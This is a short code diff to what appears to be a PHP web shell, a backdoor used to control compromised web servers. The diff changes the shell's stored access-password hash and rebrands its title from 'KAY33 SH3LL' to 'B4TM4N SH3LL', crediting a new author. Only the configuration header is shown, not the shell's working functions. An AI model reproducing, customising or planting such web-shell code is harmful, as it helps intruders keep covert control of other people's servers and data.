@@ -20,7 +20,7 @@
  *		[Password] sha1(md5('pass'))
  */
 
-$x_="75b5fc4757a9db289c0b4a4221cd717b";
+$x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
 
 /*
  * Self Script Encryptor v1.0
@@ -31,8 +31,8 @@ $x_="75b5fc4757a9db289c0b4a4221cd717b";
  */
 
 $config=array(
-	"title"     => "KAY33 SH3LL",                 // Your Title
-	"subtitle"  => "V3RS10N 2.7 ~ b0k3p",        // Your Subtitle
+	"title"     => "B4TM4N SH3LL",                 // Your Title
+	"subtitle"  => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
 	"themes"    => "br34k",                        // Your Themes (D4RK or BR34K)
 	"debug"     => false                           // Debug Mode
 );
